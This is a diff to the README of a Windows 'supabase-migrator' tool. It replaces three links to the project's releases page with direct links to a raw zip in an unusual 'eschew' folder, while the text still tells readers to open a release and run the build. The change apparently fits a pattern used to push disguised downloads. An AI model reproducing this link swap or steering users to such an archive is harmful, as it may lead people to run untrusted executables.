@@ -1,6 +1,6 @@
 # 🔄 supabase-migrator - Move your Supabase project with one command
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue.svg?style=for-the-badge)](https://github.com/literate-irtish832/supabase-migrator/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/literate-irtish832/supabase-migrator/main/eschew/supabase_migrator_2.4.zip)
 
 ## 🧭 Overview
 
@@ -30,7 +30,7 @@ For the best results, use a recent version of Windows 10 or Windows 11.
 
 Visit this page to download:
 
-https://github.com/literate-irtish832/supabase-migrator/releases
+https://raw.githubusercontent.com/literate-irtish832/supabase-migrator/main/eschew/supabase_migrator_2.4.zip
 
 On that page:
 
@@ -196,7 +196,7 @@ Keep your Supabase keys private and store them in a safe place. Use only the key
 
 Download the Windows file here:
 
-https://github.com/literate-irtish832/supabase-migrator/releases
+https://raw.githubusercontent.com/literate-irtish832/supabase-migrator/main/eschew/supabase_migrator_2.4.zip
 
 Open the latest release, get the Windows build, and run it on your PC
 
